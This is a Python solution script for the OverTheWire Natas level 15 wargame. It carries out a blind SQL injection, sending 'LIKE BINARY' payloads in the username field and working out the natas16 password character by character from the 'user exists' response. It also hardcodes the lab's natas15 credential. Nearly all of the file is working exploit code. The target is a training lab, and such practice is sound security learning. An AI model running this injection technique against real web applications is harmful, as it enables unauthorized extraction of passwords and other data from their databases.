#!/usr/bin/env python
import requests
import re
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits
print(characters)

username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url = f'http://{username}.natas.labs.overthewire.org/'
session = requests.Session()

seen_password = []

while True:
    for ch in characters:
        password_guess = ''.join(seen_password) + ch
        print(f'Trying password: {password_guess}')
        data = {"username": f'natas16" AND password LIKE BINARY "{password_guess}%" #'}
        response = session.post(url, auth=(username, password), data=data)
        content = response.text
        if 'user exists' in content:
            seen_password.append(ch)
            break

print(content)
